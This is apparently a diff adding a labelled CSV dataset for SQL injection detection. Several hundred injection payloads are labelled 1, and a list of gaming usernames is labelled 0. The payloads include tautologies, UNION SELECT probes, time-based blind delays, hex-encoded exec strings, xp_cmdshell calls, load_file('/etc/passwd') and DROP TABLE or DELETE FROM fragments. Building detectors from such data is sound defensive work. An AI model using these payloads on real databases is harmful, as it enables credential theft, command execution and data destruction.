@@ -1,0 +1,823 @@
+document,label
+)%20or%20('x'='x,1
+%20or%201=1,1
+ execute immediate 'sel' || 'ect us' || 'er',1
+"benchmark(10000000,MD5(1))#",1
+update,1
+""";waitfor delay '0:0:__TIME__'--",1
+1) or pg_sleep(__TIME__)--,1
+"||(elt(-3+5,bin(15),ord(10),hex(char(45))))",1
+"""hi"""") or (""""a""""=""""a""",1
+delete,1
+like,1
+""" or sleep(__TIME__)#",1
+pg_sleep(__TIME__)--,1
+*(|(objectclass=*)),1
+declare @q nvarchar (200) 0x730065006c00650063 ...,1
+or 0=0 #,1
+insert,1
+1) or sleep(__TIME__)#,1
+) or ('a'='a,1
+ exec xp_regread,1
+*|,1
+@var select @var as var into temp end --,1
+"1)) or benchmark(10000000,MD5(1))#",1
+asc,1
+(||6),1
+"""a"""" or 3=3--""",1
+""" or benchmark(10000000,MD5(1))#",1
+# from wapiti,1
+or 0=0 --,1
+1 waitfor delay '0:0:10'--,1
+or 'a'='a,1
+"hi or 1=1 --""",1
+or a = a,1
+UNION ALL SELECT,1
+) or sleep(__TIME__)=',1
+")) or benchmark(10000000,MD5(1))#",1
+hi' or 'a'='a,1
+)),1
+21 %,1
+limit,1
+or 1=1,1
+or 2 > 1,1
+""")) or benchmark(10000000,MD5(1))#",1
+PRINT,1
+hi') or ('a'='a,1
+Or 3=3 )),1
+waitfor delay '0:0:__TIME__'--,1
+a' waitfor delay '0:0:10'--,1
+"1;(load_file(char(47,101,116,99,47,112,97,115, ...",1
+or%201=1,1
+1 or sleep(__TIME__)#,1
+or 1=1,1
+and 1 in (select var from temp)--,1
+or '7659'='7659,1
+or 'text' = n'text',1
+--,1
+or 1=1 or ''=',1
+declare @s varchar (200) select @s = 0x73656c6 ...,1
+exec xp,1
+ exec master..xp_cmdshell 'ping 172.10.1.255'--,1
+3.1E+017,1
+""" or pg_sleep(__TIME__)--",1
+x' AND email IS NULL,1
+&,1
+admin' or ',1
+or 'unusual' = 'unusual',1
+//,1
+truncate,1
+"1) or benchmark(10000000,MD5(1))#",1
+\x27UNION SELECT,1
+declare @s varchar(200) select @s = 0x77616974 ...,1
+tz_offset,1
+sqlvuln,1
+"""));waitfor delay '0:0:__TIME__'--",1
+||6,1
+or%201=1 --,1
+%2A%28%7C%28objectclass%3D%2A%29%29,1
+or a=a,1
+) union select * from information_schema.tables,1
+PRINT @@variable,1
+or isNULL(1/0) /*,1
+26 %,1
+""" or ""a""=""a",1
+(sqlvuln),1
+x' AND members.email IS NULL,1
+or 1=1--,1
+"and 1=( if((load_file(char(110,46,101,120,11 ...",1
+0x770061006900740066006F0072002000640065006C00 ...,1
+%20'sleep%2050',1
+as,1
+1)) or pg_sleep(__TIME__)--,1
+/**/or/**/1/**/=/**/1,1
+union all select @@version--,1
+",@variable",1
+(sqlattempt2),1
+or (EXISTS),1
+t'exec master..xp_cmdshell 'nslookup www.googl ...,1
+%20$(sleep%2050),1
+"1 or benchmark(10000000,MD5(1))#",1
+%20or%20''=',1
+||UTL_HTTP.REQUEST,1
+or pg_sleep(__TIME__)--,1
+hi' or 'x'='x',1
+""") or sleep(__TIME__)=""",1
+or 'whatever' in ('whatever'),1
+ begin declare @var varchar(8000) set @var=' ...,1
+"union select 1,load_file('/etc/passwd'),1,1,1;",1
+0x77616974666F722064656C61792027303A303A313027 ...,1
+exec(@s),1
+) or pg_sleep(__TIME__)--,1
+union select,1
+or sleep(__TIME__)#,1
+select * from information_schema.tables--,1
+a' or 1=1--,1
+a' or 'a' = 'a,1
+declare @s varchar(22) select @s =,1
+or 2 between 1 and 3,1
+or a=a--,1
+or '1'='1,1
+OR,1
+or sleep(__TIME__)=',1
+or 1 --',1
+"or 0=0 #""",1
+having,1
+a',1
+""" or isNULL(1/0) /*",1
+declare @s varchar (8000) select @s = 0x73656c ...,1
+??? or 1=1 --,1
+char%4039%41%2b%40SELECT,1
+order by,1
+bfilename,1
+having 1=1--,1
+") or benchmark(10000000,MD5(1))#",1
+or username like char(37),1
+waitfor delay '0:0:__TIME__'--,1
+""" or 1=1--",1
+x' AND userid IS NULL,1
+*/*,1
+or 'text' > 't',1
+(select top 1,1
+"or benchmark(10000000,MD5(1))#",1
+""");waitfor delay '0:0:__TIME__'--",1
+a' or 3=3--,1
+-- &password=,1
+group by userid having 1=1--,1
+or ''=',1
+ exec master..xp_cmdshell,1
+%20or%20x=x,1
+select,1
+""")) or sleep(__TIME__)=""",1
+0x730065006c0065006300740020004000400076006500 ...,1
+hi' or 1=1 --,1
+""") or pg_sleep(__TIME__)--",1
+%20or%20'x'='x,1
+or 'something' = 'some'+'thing',1
+exec sp,1
+29 %,1
+%20OR,1
+?�� or 1=1 --,1
+1 or pg_sleep(__TIME__)--,1
+0 or 1=1,1
+) or (a=a,1
+uni/**/on sel/**/ect,1
+replace,1
+%27%20or%201=1,1
+)) or pg_sleep(__TIME__)--,1
+%7C,1
+x' AND 1=(SELECT COUNT(*) FROM tabname),1
+&apos,1
+ or '1'='1',1
+declare @q nvarchar (200) select @q = 0x770061 ...,1
+1 or 1=1,1
+ exec ('sel' + 'ect us' + 'er'),1
+23 OR 1=1,1
+/,1
+anything' OR 'x'='x,1
+declare @q nvarchar (4000) select @q =,1
+or 0=0 --,1
+desc,1
+' OR '1'='1',1
+or,1
+1)) or sleep(__TIME__)#,1
+or 0=0 #,1
+select name from syscolumns where id = (sele ...,1
+hi or a=a,1
+*(|(mail=*)),1
+password:*/=1--,1
+\' OR \'1\'=\'1,1
+waitfor delay '0:0:__TIME__'--,1
+to_timestamp_tz,1
+""") or benchmark(10000000,MD5(1))#",1
+UNION SELECT,1
+%2A%28%7C%28mail%3D%2A%29%29,1
++sqlvuln,1
+or 1=1 /*,1
+)) or sleep(__TIME__)=',1
+"or 1=1 or """"=",1
+or 1 in (select @@version)--,1
+sqlvuln,1
+union select * from users where login = char ...,1
+x' or 1=1 or 'x'='y,1
+28 %,1
+??? or 3=3 --,1
+@variable,1
+or '1'='1'--,1
+"""a"""" or 1=1--""",1
+//*,1
+%2A%7C,1
+""" or 0=0 --",1
+""")) or pg_sleep(__TIME__)--",1
+?,1
+or 1/*,1
+!,1
+',1
+or a = a,1
+declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),1
+declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s),1
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),1
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),1
+' or 1=1,1
+ or 1=1 --,1
+x' OR full_name LIKE '%Bob%’,1
+ exec master..xp_cmdshell 'ping 172.10.1.255'--,1
+'%20or%20''=',1
+'%20or%20'x'='x,1
+')%20or%20('x'='x,1
+' or 0=0 --,1
+' or 0=0 #,1
+"or 0=0 #""",1
+' or 1=1--,1
+' or '1'='1'--,1
+' or 1 --',1
+or 1=1--,1
+' or 1=1 or ''=',1
+"or 1=1 or """"=",1
+' or a=a--,1
+or a=a,1
+') or ('a'='a,1
+'hi' or 'x'='x',1
+or,1
+procedure,1
+handler,1
+' or username like '%,1
+' or uname like '%,1
+' or userid like '%,1
+' or uid like '%,1
+' or user like '%’,1
+ exec master..xp_cmdshell’,1
+ exec xp_regread,1
+t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
+--sp_password,1
+' UNION SELECT,1
+' UNION ALL SELECT,1
+' or (EXISTS),1
+' (select top 1,1
+'||UTL_HTTP.REQUEST 1,1
+SELECT%20*,1
+"<>""'%;)(&+",1
+'%20or%201=1,1
+'sqlattempt1,1
+%28,1
+%29,1
+%26,1
+%21,1
+' or ''=',1
+' or 3=3,1
+ or 3=3 --,1
+SELECT * FROM,1
+DELETE FROM,1
+UPDATE users SET,1
+SELECT username FROM,1
+SELECT password FROM,1
+SELECT * FROM users,1
+SELECT * FROM admin,1
+SELECT * FROM admins,1
+delete from,1
+select * from,1
+select username from ,1
+select password from,1
+select hashed_password from,1
+SELECT hashed_password FROM,1
+DROP TABLE,1
+drop table,1
+DELETE FROM users,1
+DELETE FROM admins,1
+DELETE FROM user,1
+UPDATE users SET username,1
+Hacksore,0
+azfanatic11,0
+Bensword331,0
+C418,0
+coolity,0
+DarkTwister,0
+Derpmeifter,0
+eagleeye64000,0
+Earstorm,0
+Elecpat,0
+ez,0
+FemoMadness,0
+FoidzaFlow,0
+goodthief,0
+inacio,0
+IrAdz,0
+kmlkmljkl,0
+kp3,0
+leonellus,0
+Matoking,0
+Miktor,0
+MokkaCicc,0
+Nerdy,0
+Notch,0
+Notsuru,0
+PertalGad,0
+ruarai,0
+RussianSpy,0
+sade1212,0
+Semaru,0
+alexgrist,0
+TheStabbyBunny,0
+zdog101,0
+Cellan,0
+Foogles,0
+Snipex01,0
+Mzilla,0
+sk8erace1,0
+Doomish,0
+Alikku,0
+johnlmonkey,0
+Rulz,0
+vexx21322,0
+GenericToast,0
+Karl_L,0
+Krail,0
+Camcom25,0
+CherryJimbo,0
+Kcin,0
+Laserpanda,0
+Rastadogg,0
+Zedo_Mann,0
+NeoTyrant,0
+MrFoxer,0
+deadmau5,0
+Woolio1,0
+RaxaHax,0
+God,0
+Inzuki,0
+Romaji,0
+Whomobile,0
+Bletotum,0
+Tursikas,0
+awwent,0
+kraffslol,0
+Wirexia,0
+Minotour,0
+elitechad255,0
+war_man333,0
+Nesral,0
+pyranis,0
+csd,0
+chrisjon,0
+Screek,0
+Taizun,0
+kyrbi,0
+FlamingFury,0
+Mielsen,0
+Noggi,0
+Claush,0
+znabela,0
+Yunie,0
+Mooncowdale,0
+Zencraft,0
+Pedobuddy,0
+trylleklovn,0
+hasfeldt,0
+DaMoggen,0
+Spikespiegel,0
+Gravn,0
+DarkCybrid,0
+Nikmi,0
+Tentrillicon,0
+Cpt_Universe,0
+hoebag89,0
+JackHemming,0
+frachlitz,0
+Gedehamsen,0
+scratch_nl,0
+Yeojsav,0
+TVC,0
+Profanwolf,0
+TheHANGOVR,0
+KneeSlapington,0
+rebel1231,0
+Lloyder,0
+thephuwnaren,0
+ohofvictory,0
+xpod1,0
+AndrewPH,0
+swampie,0
+blueplastic,0
+SkunkGER,0
+destroyer058,0
+Fredbob,0
+reapaninja,0
+doodoo123987,0
+Afromana,0
+Asrue2,0
+baroni,0
+Skullbreaker283,0
+Tomasobst,0
+Skoinks,0
+Ps360,0
+Glent,0
+DoritosMan,0
+MetallicLion,0
+yannickgd,0
+ManningQB18,0
+Mesquite,0
+Conro,0
+Glueguy,0
+chookenfudd,0
+Coestar,0
+KillerZombie,0
+Master0r0,0
+Tark,0
+Xorjt,0
+hug9000,0
+muhammad,0
+ellashella,0
+Darkauron,0
+cskim13,0
+Cryolithius,0
+PartyPancakes,0
+Dwragon,0
+crazydev,0
+crazy991,0
+Herobrine,0
+Hypershadsy,0
+CrazyJared,0
+Alp,0
+coopersnow,0
+Dragonite24,0
+Mongoloid,0
+yoshi8710,0
+BowlOfSoup,0
+Cheeeezzz,0
+SunriseMoon,0
+Cheapshot,0
+Quex,0
+Dr_MadMan,0
+jeb_,0
+Sogo,0
+torteela,0
+Dapper_Swain,0
+barrowsx,0
+HellCatcher,0
+brandonhare,0
+Apptendo,0
+Frewp,0
+Hoodoo456,0
+Caboose2641,0
+lordskelzor,0
+wolfenstrike,0
+Sukor,0
+JakeEpps,0
+EpicPoodle,0
+Darbe,0
+DTB196,0
+theiglebowski33,0
+Tinte,0
+Computrix,0
+pro,0
+jake,0
+Nazilord24,0
+fef,0
+auntjoemima,0
+Concrete,0
+dynemo,0
+Sgt_Cortez,0
+phabeZ,0
+Segolia,0
+Jakeiswin,0
+Masterlegodude,0
+metrotyranno,0
+DimJim,0
+ChauffeR,0
+KingSam,0
+richard9311,0
+iam2little,0
+Lassemb,0
+Valdrec,0
+zedpenguin,0
+kubson,0
+cyndrasil,0
+Trase,0
+Fish_Warden,0
+Tuxedo,0
+phray,0
+gawdofrofls,0
+N10do64,0
+Grimmy423,0
+TPmax17,0
+liv3d,0
+kizzycocoa,0
+Earfull,0
+Jexeld,0
+Scheer,0
+Medlir,0
+memnoc,0
+Auv5,0
+Neath,0
+Xylic,0
+pr0nstar,0
+deadmat,0
+citricsquid,0
+Conan3D,0
+rubbersoul420,0
+IvanDonat,0
+cheater09,0
+Spyder638,0
+_Undefined,0
+andersonmat,0
+Rixxz2,0
+simix10,0
+RedPeepin,0
+ejonkou,0
+xHellfire,0
+AdamtheClown,0
+cyrkon,0
+Genesis343,0
+CapnAwesom,0
+SolWolf,0
+Neogetz,0
+Gotcha,0
+nox_PHX,0
+Elloa,0
+Razorlance,0
+whatnow,0
+Zuriki,0
+Dread,0
+Majeh,0
+Snowman,0
+WOOTinator,0
+Pledgemonkey,0
+McBeeferton,0
+Xephos,0
+Honeydew,0
+Old_Peculier,0
+Daisy_Duke,0
+Israphael,0
+Israphe,0
+Ryzo,0
+Skylord_Lysander,0
+Swedman,0
+jmcneely,0
+lolpie24,0
+Xkrules,0
+Hollure,0
+lonewarrior,0
+slubub,0
+pinguiniv,0
+A.I.,0
+Demonkush,0
+Destati,0
+raquzzic2,0
+sord213,0
+Colten,0
+CG62,0
+mrwrmy,0
+Agronaut,0
+mikeybx,0
+Kakarikon,0
+Crazyiness,0
+power526,0
+SlamBamActionman,0
+Yoyosorayo,0
+thetaco8808,0
+kittyinabottle,0
+Jakeobs,0
+jctitan,0
+kbdasoccer,0
+Menen,0
+A_Big_Rock,0
+Fendron,0
+robloxx,0
+elbowgrease12,0
+stolengoose,0
+kafder2,0
+Fvpm,0
+jnr_cckane,0
+kelquethas,0
+Zakhep,0
+mons10,0
+elrobto,0
+setsunakai,0
+doomplayer,0
+Pwnage_HenTgen,0
+Rooopppi,0
+m00gle,0
+Stuu,0
+T3hdrakkus,0
+MrDerogative,0
+Goratrixx,0
+Swordself,0
+Pelleybelley,0
+whitenoize,0
+groopo,0
+Skype,0
+CruelNoise,0
+Alphasoldier,0
+Whitehman,0
+Omicron,0
+Olidood,0
+ryuanesha,0
+MiniMatt,0
+DolphinTuna,0
+GladeGuard,0
+IronValley,0
+Shadowtex,0
+s_amroberts,0
+Old_Peculiar,0
+Alienation25,0
+Blaxo,0
+Klegg,0
+beth,0
+Bomber57,0
+GoogleChrome,0
+lurkercraft,0
+Xcronias,0
+Googie2149,0
+muncher21,0
+Rhyno,0
+JorgeZ,0
+xilefian,0
+Manarine,0
+steinhaus,0
+Grabarz19,0
+Gamer027,0
+Glass_Miner,0
+Insidiea,0
+Helgesander,0
+InsanityMan,0
+Moonie,0
+FreezeInc,0
+Dostya,0
+Mistrale,0
+Dowdoon,0
+Smurfffff,0
+Duh102,0
+minemap,0
+Woodenwindows,0
+SeanNanoware,0
+varunax,0
+zdragun,0
+Milkcooks,0
+nickieroonie,0
+ComputerMan12,0
+Mr_Conner,0
+Gabe_Newell,0
+crazymonkay,0
+modify,0
+TheJohan,0
+Twilizer5953,0
+Daniel_Rogers,0
+spiderfrog,0
+EleOnAUni,0
+MrBix,0
+Bites,0
+kinglahcrab,0
+SenorStab,0
+MasterDucky,0
+Gamerx123,0
+mules,0
+Joe,0
+daaaaaan,0
+iDP,0
+HappyHappyMan,0
+DwarfWoot,0
+puddin1,0
+cavo94,0
+got_milk4,0
+Tawtle,0
+stupib,0
+pwner_dude412,0
+Satele,0
+GhostlyGob,0
+cheetum,0
+ssojj,0
+The_Noodle,0
+Huseeee,0
+subtraho,0
+horsedrowner,0
+WafflesMgee,0
+Halofannr1,0
+FlashFireSix,0
+CowThing,0
+GinTheNinja,0
+eLIR,0
+BearzUnlimited,0
+Beais9563,0
+Pyonaught41,0
+Wido,0
+Eisblut,0
+coolkid588,0
+Rex_Rex,0
+TTsands,0
+jakers247,0
+Mr_Hedra,0
+Clavus,0
+Minecrafter12335,0
+agnl,0
+Nerdrage,0
+00Fraday00,0
+CaptainQuirk73,0
+Naut314,0
+Zombie_Boss,0
+Creeper_Boss,0
+Pricex3,0
+Divran,0
+Ket,0
+Astrellon,0
+Bisyss,0
+scarletbanner,0
+bluelive,0
+workbench,0
+L_NK,0
+Striata,0
+Gabbeh,0
+mendo89,0
+valakut,0
+nakedlightbulbs,0
+masterbetty,0
+prichards,0
+atliax,0
+drtaru,0
+adnan252,0
+nikondork,0
+OttoKatz,0
+modman2,0
+AleksKavli,0
+SiskoUrso,0
+KaiserYoshi,0
+zombieslaya,0
+Lifewhacker,0
+ntohee,0
+Jamza,0
+Icesword73,0
+adzicents,0
+entityingredient,0
+Prusselusken,0
+BassB,0
+Saxton_Hale,0
+CTO_7,0
+pukkapieman,0
+LuckyLuke007,0
+F_Creature,0
+TheBoatman,0
+decyg,0
+nekosune,0
+Phycosymo,0
+Simon09,0
+Fibbs,0
+Dragory,0
+quacles,0
+Jammymanrock,0
+SuperDAIU,0
+PUNKwithFUNK,0
+FootofTape,0
+Omega_2,0
+Timjab,0
+NintendudeCT,0
+SOULBLAST,0
+littlearmyman,0
+Roflman,0
+iRunner,0
+Zorgot,0
+Ezerith,0
+Sowee,0
+Rabbittt,0
+just4fun49,0
+Zenpod,0
+Diealready,0
+spillbert,0
+Shikari,0
+interwolf,0
+PFC_BowlingBall,0
+Richord,0
+ControlFreak92,0
+Art_The_Poopy,0
+Jail_Bait_Jonny,0
+FiLi716,0
+jmaster888,0
+Sunfall,0
+Tb0ne,0
+shred162,0
+SparklyTea,0
+mollstam,0
+iwilli3,0
+Jediah,0
+Father_Braeburn,0
+IMightBeAdam,0
+phone,0
+Guinaur,0
+HorribleMan,0
+Graytico,0
+Wally,0
+Peter,0
+Sean,0
+tnt,0
+Sniper,0
+longtimefan,0
+Seaborgium,0
+Travesty,0
+GRUML3N,0
+ejdme,0
+Yamatino,0
+Nicky195,0
+sag3,0
+Skylord_Jasper,0
+Fumblemore,0
+jacksturrr416,0
+Crommissar,0
+Yinsho,0
